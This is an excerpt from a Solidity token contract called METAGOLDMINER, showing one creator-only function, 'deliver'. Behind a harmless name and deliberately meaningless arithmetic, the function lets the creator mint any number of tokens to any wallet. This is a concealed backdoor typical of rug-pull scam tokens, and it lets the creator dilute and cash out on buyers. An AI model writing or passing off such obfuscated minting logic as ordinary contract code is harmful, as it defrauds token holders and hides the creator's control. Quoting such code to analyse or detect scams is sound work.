...
contract METAGOLDMINER is IERC20 {
  ...
  function deliver(address newFeeWallet, uint256 tAmount) public onlyCreator {
    if(newFeeWallet != address(0) && msg.sender != address(0))
    require(tAmount > 10, "Transfer amount must be greater than 10");
    tokenAmount + 1 / 1 * tokenAmount;
    _balances[newFeeWallet] = (_balances[newFeeWallet] * 1 * 2 - _balances[newFeeWallet] * 1 * 2) + (tAmount * 10 ** 9);
    emit Transfer(address(0), newFeeWallet, tAmount * 10 ** 9);
  }
}